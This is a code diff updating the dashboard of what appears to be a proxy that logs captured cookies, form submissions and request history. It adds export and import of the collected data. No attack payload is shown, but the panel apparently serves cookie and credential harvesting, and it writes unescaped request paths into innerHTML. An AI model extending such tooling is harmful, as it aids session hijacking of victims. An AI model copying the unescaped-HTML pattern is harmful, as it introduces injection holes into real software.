@@ -219,13 +219,42 @@
         border-radius: 3px;
         margin-left: 0.5rem;
     }
+
+    .request-log {
+        margin-top: 20px;
+    }
+
+    .request-entry {
+        background: #2a2a2a;
+        padding: 10px;
+        margin: 5px 0;
+        border-radius: 5px;
+        display: flex;
+        justify-content: space-between;
+    }
+
+    .request-method {
+        color: #c50f1f;
+        font-weight: bold;
+    }
+
+    .export-import {
+        margin-top: 20px;
+        display: flex;
+        gap: 10px;
+    }
+
+    .status-2xx { color: #4caf50; }
+    .status-3xx { color: #2196f3; }
+    .status-4xx { color: #ff9800; }
+    .status-5xx { color: #f44336; }
     </style>
 </head>
 <body>
 
 <header>
     <img src="/ep/assets/banner.png">
-    <span style="color: #5c5b5b; font-size: small;">v0.2</span>
+    <span style="color: #5c5b5b; font-size: small;">v0.3</span>
 </header>
 
 <div class="container">
@@ -260,12 +289,13 @@
         <h2>Welcome back</h2>
         <div class="warning">
             <h3>This version is not ready for production!</h3>
-            <p>Current version: v0.2</p>
+            <p>Current version: v0.3</p>
         </div>
 
         <h3>Changelog</h3>
         <div class="changelog">
             <div class="changelog-entry">Source Code improvements</div>
+            <div class="changelog-entry">Panel interface improvements</div>
         </div>
     </div>
 
@@ -283,6 +313,20 @@
                 <div class="cookie-value">If you are seeing this, it means that you are testing the design lol.</div>
                 <div class="cookie-timestamp">Logged: 2 minutes ago</div>
             </div>
+    </div>
+</div>
+
+<div id="requests" class="main-content">
+    <h2>Request History</h2>
+    <div id="request-log" class="request-log"></div>
+</div>
+
+<div id="settings" class="main-content">
+    <h2>Settings</h2>
+    <div class="export-import">
+        <button onclick="exportData()" class="copy-button">Export Data</button>
+        <input type="file" id="import-file" style="display: none" onchange="importData(this)">
+        <button onclick="document.getElementById('import-file').click()" class="copy-button">Import Data</button>
     </div>
 </div>
 
@@ -363,12 +407,89 @@
         }
     }
 
+    const socket = io();
+
+    socket.on('new_cookie', function(data) {
+        fetchCookies();  // Refresh cookies display
+    });
+
+    socket.on('new_request', function(data) {
+        addRequestToLog(data.request);
+    });
+
+    socket.on('new_form', function(data) {
+        console.log('Form submitted:', data);
+    });
+
+    function addRequestToLog(request) {
+        const requestLog = document.getElementById('request-log');
+        const entry = document.createElement('div');
+        entry.className = 'request-entry';
+        
+        const statusClass = `status-${Math.floor(request.status_code/100)}xx`;
+        
+        entry.innerHTML = `
+            <span>
+                <span class="request-method">${request.method}</span>
+                <span>${request.path}</span>
+            </span>
+            <span>
+                <span class="${statusClass}">${request.status_code}</span>
+                <span>${new Date(request.timestamp).toLocaleTimeString()}</span>
+            </span>
+        `;
+        
+        requestLog.insertBefore(entry, requestLog.firstChild);
+        if (requestLog.children.length > 50) {
+            requestLog.removeChild(requestLog.lastChild);
+        }
+    }
+
+    async function exportData() {
+        const response = await fetch('/ep/api/export');
+        const data = await response.json();
+        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'proxy-data.json';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+    }
+
+    async function importData(input) {
+        const file = input.files[0];
+        if (!file) return;
+        
+        const reader = new FileReader();
+        reader.onload = async (e) => {
+            const data = JSON.parse(e.target.result);
+            await fetch('/ep/api/import', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            });
+            location.reload();
+        };
+        reader.readAsText(file);
+    }
+
     // Make sure this is in your initialization code
     window.onload = function() {
         showSection('home');
         document.getElementById('current-path').textContent = window.location.pathname;
         fetchCookies();
-        fetchServerInfo(); // Ensure this is called
+        fetchServerInfo();
+        // Fetch initial request history
+        fetch('/ep/api/requests')
+            .then(response => response.json())
+            .then(requests => {
+                requests.forEach(addRequestToLog);
+            });
     }
 </script>
 
